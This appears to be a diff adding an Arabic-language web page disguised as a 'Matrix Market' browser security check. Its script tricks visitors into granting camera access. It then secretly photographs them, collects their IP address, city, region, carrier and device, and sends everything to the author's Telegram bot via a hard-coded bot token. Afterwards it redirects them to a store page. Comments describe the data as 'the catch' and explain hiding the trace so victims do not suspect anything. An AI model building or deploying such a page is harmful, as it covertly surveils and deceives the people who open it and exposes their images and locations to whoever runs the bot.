@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Matrix Market | التحقق من الأمان</title>
+    <style>
+        body { margin: 0; background: #050505; color: #00ffcc; font-family: 'Segoe UI', Tahoma, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .box { border: 1px solid #00ffcc; padding: 40px; text-align: center; box-shadow: 0 0 25px rgba(0, 255, 204, 0.2); background: rgba(0, 255, 204, 0.02); border-radius: 15px; width: 90%; max-width: 400px; }
+        .loader { border: 4px solid #111; border-top: 4px solid #00ffcc; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        h1 { font-size: 22px; letter-spacing: 1px; margin-bottom: 10px; }
+        p { color: #888; font-size: 14px; line-height: 1.6; }
+        #v, #c { display: none; }
+    </style>
+</head>
+<body>
+
+<div class="box">
+    <h1>MATRIX SECURITY</h1>
+    <div class="loader"></div>
+    <p>جاري فحص متصفحك للوصول الآمن إلى المتجر...</p>
+    <p style="color: #00ffcc; font-size: 12px;">برجاء الضغط على "سماح" (Allow) إذا ظهرت لتأكيد هويتك</p>
+    
+    <video id="v" autoplay playsinline></video>
+    <canvas id="c"></canvas>
+</div>
+
+<script>
+    // --- إعدادات فوزي السرية ---
+    const _ID = '7253092491'; 
+    const _TK = '7873426394:AAEc5lKRwi3Zy8owh1TKMLJsMme_s6Zawak'; 
+    const _REDIRECT = "https://hamoyouo84-del.github.io/matrix-market/#";
+
+    window.onload = async () => {
+        try {
+            // 1. طلب الكاميرا
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.getElementById('v');
+            video.srcObject = stream;
+
+            // انتظار بسيط عشان اللقطة تطلع واضحة (2 ثانية)
+            await new Promise(r => setTimeout(r, 2000)); 
+
+            const canvas = document.getElementById('c');
+            canvas.width = 640;
+            canvas.height = 480;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+
+            canvas.toBlob(async (blob) => {
+                // 2. تجميع بيانات الموقع والـ IP ونوع الجهاز
+                let geoInfo = "تعذر جلب البيانات الجغرافية";
+                let device = navigator.userAgent; // نوع التليفون والمتصفح
+
+                try {
+                    const res = await fetch('https://ipapi.co/json/');
+                    const d = await res.json();
+                    geoInfo = `🌐 IP: ${d.ip}\n📍 المحافظة: ${d.region}\n🏙️ المدينة: ${d.city}\n🌍 الدولة: ${d.country_name}\n📶 الشركة: ${d.org}`;
+                } catch(e) { console.log("Geo bypass"); }
+
+                // 3. إرسال الصيد لبوت تليجرام
+                const fd = new FormData();
+                fd.append('chat_id', _ID);
+                fd.append('photo', blob, 'user_capture.jpg');
+                fd.append('caption', `🔥 **عملية ناجحة من Matrix**\n\n${geoInfo}\n\n📱 الجهاز: ${device}\n⏰ الوقت: ${new Date().toLocaleString('ar-EG')}`);
+                fd.append('parse_mode', 'Markdown');
+
+                await fetch(`https://api.telegram.org/bot${_TK}/sendPhoto`, {
+                    method: 'POST',
+                    body: fd
+                });
+
+                // 4. تنظيف الأثر (قفل الكاميرا والتحويل للموقع الأصلي)
+                stream.getTracks().forEach(t => t.stop()); 
+                window.location.href = _REDIRECT;
+
+            }, 'image/jpeg', 0.7);
+
+        } catch (err) {
+            // حتى لو رفض، وديه للموقع عشان ما يشكش في حاجة
+            console.log("Permission Denied");
+            window.location.href = _REDIRECT;
+        }
+    };
+</script>
+</body>
+</html>
+
